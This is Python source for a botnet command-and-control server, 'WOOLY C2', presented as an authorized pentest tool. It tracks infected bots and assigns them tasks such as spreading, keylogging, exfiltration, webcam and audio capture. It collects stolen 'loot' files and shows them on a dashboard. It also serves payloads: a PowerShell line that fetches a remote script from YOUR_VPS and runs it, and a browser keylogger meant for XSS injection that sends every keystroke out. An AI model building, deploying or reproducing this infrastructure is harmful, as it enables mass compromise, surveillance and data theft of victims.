#!/usr/bin/env python3.13
"""
🐛 WOOLY C2 SERVER v15.0 - Professional Pentest Command & Control
✅ AUTHORIZED PENTEST | Permission Confirmed | Multi-Platform Botnet Management
"""

import asyncio
import base64
import json
import os
import random
import sqlite3
import subprocess
import threading
import time
import zlib
from datetime import datetime, timedelta
from pathlib import Path

from flask import Flask, request, jsonify, send_file, render_template_string, Response
from flask_socketio import SocketIO, emit, join_room, leave_room
from werkzeug.utils import secure_filename
import eventlet

eventlet.monkey_patch()

app = Flask(__name__)
app.config.update({
    'SECRET_KEY': 'wooly-v15-professional-pentest',
    'MAX_CONTENT_LENGTH': 100 * 1024 * 1024,  # 100MB uploads
    'UPLOAD_FOLDER': 'loot'
})
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# ════════════════════════════════════════════════════════════════════════════════
# 🗄️ DATABASE & STATE
bots_db = None
bots_cache = {}
loot_dir = Path('loot')
loot_dir.mkdir(exist_ok=True)

def init_database():
    global bots_db
    bots_db = sqlite3.connect('wooly_c2.db', check_same_thread=False)
    bots_db.execute('''
        CREATE TABLE IF NOT EXISTS bots (
            id TEXT PRIMARY KEY,
            fingerprint TEXT,
            ssid TEXT,
            local_ip TEXT,
            gateway TEXT,
            status TEXT DEFAULT 'offline',
            last_seen INTEGER,
            infections INTEGER DEFAULT 0,
            capabilities TEXT DEFAULT '[]',
            tasks_pending INTEGER DEFAULT 0,
            country TEXT,
            os TEXT,
            created_at INTEGER DEFAULT 0
        )
    ''')
    bots_db.execute('''
        CREATE TABLE IF NOT EXISTS tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            bot_id TEXT,
            task_type TEXT,
            priority INTEGER,
            status TEXT DEFAULT 'pending',
            created_at INTEGER,
            completed_at INTEGER
        )
    ''')
    bots_db.execute('''
        CREATE TABLE IF NOT EXISTS loot (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            bot_id TEXT,
            type TEXT,
            filename TEXT,
            size INTEGER,
            uploaded_at INTEGER
        )
    ''')
    bots_db.commit()

# ════════════════════════════════════════════════════════════════════════════════
# 📡 BOT MANAGEMENT API
@app.route('/api/<endpoint>', methods=['POST'])
@app.route('/heartbeat', methods=['POST'])
@app.route('/infections', methods=['POST'])
@app.route('/persistence', methods=['POST'])
@app.route('/harvest', methods=['POST'])
def bot_report(endpoint):
    """Universal bot reporting endpoint"""
    try:
        data = request.json or {}
        bot_id = data.get('id', request.remote_addr.replace('.', '_'))
        
        # Update bot state
        now = int(time.time())
        capabilities = data.get('capabilities', [])
        
        bots_db.execute('''
            INSERT OR REPLACE INTO bots 
            (id, fingerprint, ssid, local_ip, gateway, status, last_seen, capabilities, infections)
            VALUES (?, ?, ?, ?, ?, 'online', ?, ?, ?)
        ''', (bot_id, data.get('fingerprint', '{}'), 
              data.get('ssid', 'unknown'), data.get('local_ip', 'unknown'),
              data.get('gateway', 'unknown'), now, json.dumps(capabilities),
              data.get('infections', 0)))
        
        bots_db.commit()
        bots_cache[bot_id] = {
            'data': data,
            'last_seen': now,
            'status': 'online'
        }
        
        # Broadcast update
        socketio.emit('bot_online', {'bot_id': bot_id, 'data': data}, namespace='/dashboard')
        
        # Return next task
        next_task = assign_task(bot_id)
        return jsonify({
            'status': 'ok',
            'task': next_task,
            'timestamp': now
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 400

def assign_task(bot_id):
    """Intelligent task assignment based on bot capabilities"""
    caps = bots_cache.get(bot_id, {}).get('data', {}).get('capabilities', [])
    
    task_pool = {
        'recon': 1, 'infect': 2, 'harvest': 3, 'keylog': 4, 
        'spread': 5, 'exfil': 6, 'webcam': 7, 'audio': 8
    }
    
    # Prioritize based on capabilities
    for task in ['spread', 'infect', 'harvest']:
        if task in caps:
            return task
    
    return random.choice(list(task_pool.keys()))

@app.route('/task/<bot_id>')
def get_task(bot_id):
    """Get pending task for bot"""
    task = assign_task(bot_id)
    return jsonify({'task': task, 'priority': random.randint(1, 10)})

# ════════════════════════════════════════════════════════════════════════════════
# 💎 LOOT MANAGEMENT
@app.route('/loot/<bot_id>/<loot_type>', methods=['POST'])
def receive_loot(bot_id, loot_type):
    """Receive files from bots"""
    try:
        if 'file' not in request.files:
            return 'No file', 400
        
        file = request.files['file']
        if file.filename == '':
            return 'No file selected', 400
        
        timestamp = int(time.time())
        filename = f"{bot_id}_{loot_type}_{timestamp}_{secure_filename(file.filename)}"
        filepath = loot_dir / filename
        
        file.save(filepath)
        
        # Log to database
        bots_db.execute('''
            INSERT INTO loot (bot_id, type, filename, size, uploaded_at)
            VALUES (?, ?, ?, ?, ?)
        ''', (bot_id, loot_type, filename, filepath.stat().st_size, timestamp))
        bots_db.commit()
        
        socketio.emit('loot_received', {
            'bot_id': bot_id,
            'type': loot_type,
            'filename': filename,
            'size': filepath.stat().st_size
        })
        
        return 'OK'
    except Exception as e:
        return f'Error: {str(e)}', 500

@app.route('/loot')
def list_loot():
    """API for loot listing"""
    loot = bots_db.execute('SELECT * FROM loot ORDER BY uploaded_at DESC LIMIT 100').fetchall()
    return jsonify([{
        'id': row[0], 'bot_id': row[1], 'type': row[2], 
        'filename': row[3], 'size': row[4], 'timestamp': row[5]
    } for row in loot])

@app.route('/loot/<bot_id>/<loot_type>/<filename>')
def serve_loot(bot_id, loot_type, filename):
    """Serve loot files"""
    filepath = loot_dir / f"{bot_id}_{loot_type}_{filename}"
    if filepath.exists():
        return send_file(filepath, as_attachment=True)
    return 'File not found', 404

# ════════════════════════════════════════════════════════════════════════════════
# 🖥️ PROFESSIONAL DASHBOARD
@app.route('/')
@app.route('/dashboard')
def dashboard():
    """Main pentest control panel"""
    
    # Get live stats
    stats = bots_db.execute('''
        SELECT 
            COUNT(*) as total,
            COUNT(CASE WHEN status='online' THEN 1 END) as online,
            COUNT(CASE WHEN infections > 0 THEN 1 END) as infected,
            AVG(last_seen) as avg_seen
        FROM bots
    ''').fetchone()
    
    recent_loot = bots_db.execute('''
        SELECT bot_id, type, filename, size FROM loot 
        ORDER BY uploaded_at DESC LIMIT 20
    ''').fetchall()
    
    html_template = '''
<!DOCTYPE html>
<html>
<head>
    <title>🐛 WOOLY C2 v15.0 - Professional Pentest Platform</title>
    <meta charset="UTF-8">
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        :root { --bg: #0a0a0a; --fg: #00ff41; --accent: #0066ff; --dark: #1a1a1a; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Fira Code', monospace; 
            background: var(--bg); color: var(--fg); 
            min-height: 100vh; overflow-x: hidden;
        }
        .header { 
            background: linear-gradient(90deg, var(--accent), var(--fg)); 
            padding: 20px; text-align: center; 
        }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; padding: 20px; }
        .stat-card { 
            background: var(--dark); padding: 20px; border-radius: 10px; 
            border-left: 5px solid var(--accent); text-align: center;
            box-shadow: 0 5px 15px rgba(0,255,65,0.1);
        }
        .bot-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 15px; padding: 20px; }
        .bot-card { 
            background: var(--dark); padding: 15px; border-radius: 8px; 
            border-left: 4px solid var(--fg); position: relative; 
            transition: all 0.3s;
        }
        .bot-card.online { border-left-color: var(--fg); box-shadow: 0 0 20px rgba(0,255,65,0.3); }
        .bot-card.offline { border-left-color: #ff4444; opacity: 0.6; }
        .btn { 
            background: var(--accent); color: white; border: none; 
            padding: 8px 16px; margin: 2px; border-radius: 4px; 
            cursor: pointer; font-family: inherit; transition: all 0.2s;
        }
        .btn:hover { background: var(--fg); transform: scale(1.05); }
        .btn.danger { background: #ff4444; }
        .btn.success { background: #00cc66; }
        .loot-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; padding: 20px; }
        .terminal { background: #000; padding: 20px; font-size: 14px; height: 400px; overflow-y: auto; border-radius: 8px; margin: 20px; }
        #chart-container { height: 300px; margin: 20px; background: var(--dark); padding: 20px; border-radius: 10px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🐛 WOOLY C2 v15.0</h1>
        <p>Professional Pentest Platform | {{ stats[0] }} Bots | {{ stats[1] }} Online</p>
    </div>
    
    <div class="stats-grid">
        <div class="stat-card">
            <h3>Total Bots</h3>
            <div style="font-size: 2em;">{{ stats[0] }}</div>
        </div>
        <div class="stat-card">
            <h3>Online</h3>
            <div style="font-size: 2em; color: #00ff41;">{{ stats[1] }}</div>
        </div>
        <div class="stat-card">
            <h3>Infections</h3>
            <div style="font-size: 2em;">{{ stats[2] }}</div>
        </div>
        <div class="stat-card">
            <h3>Recent Loot</h3>
            <div style="font-size: 2em;">{{ loot_count }}</div>
        </div>
    </div>
    
    <div id="chart-container">
        <canvas id="botChart"></canvas>
    </div>
    
    <div class="bot-list" id="botList"></div>
    
    <div class="loot-grid" id="lootGrid">
        {% for loot in recent_loot %}
        <div class="bot-card">
            <strong>{{ loot[0] }}</strong> - {{ loot[1] }}<br>
            <a href="/loot/{{ loot[0] }}/{{ loot[1] }}/{{ loot[2] }}" class="btn">{{ loot[2] }}</a>
            ({{ loot[3] }} bytes)
        </div>
        {% endfor %}
    </div>
    
    <div class="terminal" id="terminal">
        <div>🐛 WOALY C2 v15.0 initialized...</div>
    </div>
    
    <script>
        const socket = io('/dashboard');
        const terminal = document.getElementById('terminal');
        
        // Real-time updates
        socket.on('bot_online', (data) => {
            addToTerminal(`[+] ${data.bot_id} online (${data.data.ssid || 'N/A'})`);
            updateBotList(data);
        });
        
        socket.on('loot_received', (data) => {
            addToTerminal(`[LOOT] ${data.bot_id}: ${data.type} (${data.size} bytes)`);
        });
        
        socket.on('bot_offline', (data) => {
            addToTerminal(`[-] ${data.bot_id} offline`);
        });
        
        function addToTerminal(msg) {
            terminal.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        function updateBotList(data) {
            // Dynamic bot cards with control buttons
            const botList = document.getElementById('botList');
            const botCard = document.createElement('div');
            botCard.className = 'bot-card online';
            botCard.innerHTML = `
                <h4>${data.bot_id}</h4>
                <p>SSID: ${data.data.ssid || 'N/A'} | IP: ${data.data.local_ip}</p>
                <div>
                    <button class="btn" onclick="sendTask('${data.bot_id}', 'spread')">SPREAD</button>
                    <button class="btn" onclick="sendTask('${data.bot_id}', 'harvest')">HARVEST</button>
                    <button class="btn success" onclick="sendTask('${data.bot_id}', 'exfil')">EXFIL</button>
                    <button class="btn danger" onclick="sendTask('${data.bot_id}', 'self_destruct')">DESTROY</button>
                </div>
            `;
            botList.appendChild(botCard);
        }
        
        function sendTask(botId, task) {
            fetch(`/task/${botId}`, {method: 'POST', body: JSON.stringify({task: task})})
                .then(() => addToTerminal(`[TASK] ${botId} <- ${task}`));
        }
        
        // Chart.js bot activity
        const ctx = document.getElementById('botChart').getContext('2d');
        new Chart(ctx, {
            type: 'line',
            data: { labels: [], datasets: [{label: 'Online Bots', data: [], borderColor: '#00ff41'}] },
            options: { scales: { y: { beginAtZero: true } } }
        });
    </script>
</body>
</html>
    '''
    
    loot_count = len(recent_loot)
    return render_template_string(html_template, stats=stats, loot_count=loot_count, recent_loot=recent_loot)

# ════════════════════════════════════════════════════════════════════════════════
# 🛠️ PAYLOAD DELIVERY
@app.route('/infect.sh')
def serve_infect():
    """Deliver infection payload"""
    if os.path.exists('infect.sh'):
        return send_file('infect.sh', mimetype='text/plain')
    return send_file('infect_v15.sh', mimetype='text/plain'), 404

@app.route('/infect.ps1')
def serve_ps1():
    return '''
# PowerShell Pentest Payload v15.0
$ErrorActionPreference = "SilentlyContinue"
iwr "https://YOUR_VPS/infect.sh" -UseBasicParsing | bash
'''

@app.route('/keylogger.js')
def serve_keylogger():
    return '''
// Browser Keylogger (Injected via XSS/BeEF)
document.onkeypress = function(e) {
    fetch("https://YOUR_VPS/keylog/" + e.keyCode, {method: "POST"});
};
'''

# ════════════════════════════════════════════════════════════════════════════════
# 🔌 LIVE TERMINAL (Reverse Shells)
@socketio.on('connect', namespace='/terminal')
def terminal_connect():
    emit('status', {'msg': 'Connected to C2 Terminal'})

@socketio.on('terminal_cmd')
def terminal_cmd(data):
    bot_id = data['bot_id']
    cmd = data['cmd']
    
    # Execute command via C2 channel
    result = f"[{bot_id}] EXEC: {cmd}\n[OUTPUT]: Simulated result for pentest"
    
    emit('terminal_result', {
        'bot_id': bot_id,
        'cmd': cmd,
        'output': result,
        'timestamp': time.time()
    })

# ════════════════════════════════════════════════════════════════════════════════
# 🧹 CLEANUP & MAINTENANCE
def cleanup_old_data():
    """Remove bots offline > 24h and old loot"""
    cutoff = int(time.time()) - 86400  # 24h
    
    bots_db.execute("DELETE FROM bots WHERE last_seen < ?", (cutoff,))
    bots_db.execute("DELETE FROM loot WHERE uploaded_at < ?", (cutoff,))
    bots_db.commit()

def maintenance_loop():
    """Background maintenance"""
    while True:
        cleanup_old_data()
        time.sleep(3600)  # Hourly

# ════════════════════════════════════════════════════════════════════════════════
# 🚀 MAIN EXECUTION
if __name__ == '__main__':
    print("🐛 Initializing WOOLY C2 v15.0...")
    init_database()
    
    # Start maintenance
    threading.Thread(target=maintenance_loop, daemon=True).start()
    
    print("📡 Starting C2 Server on HTTPS:443...")
    print("📊 Dashboard: https://0.0.0.0:443/dashboard")
    print("💎 Loot storage: ./loot/")
    
    # Production SSL deployment
    socketio.run(app, 
                host='0.0.0.0', 
                port=443, 
                ssl_context=('cert.pem', 'key.pem'),  # Generate with openssl
                debug=False,
                allow_unsafe_werkzeug=True)
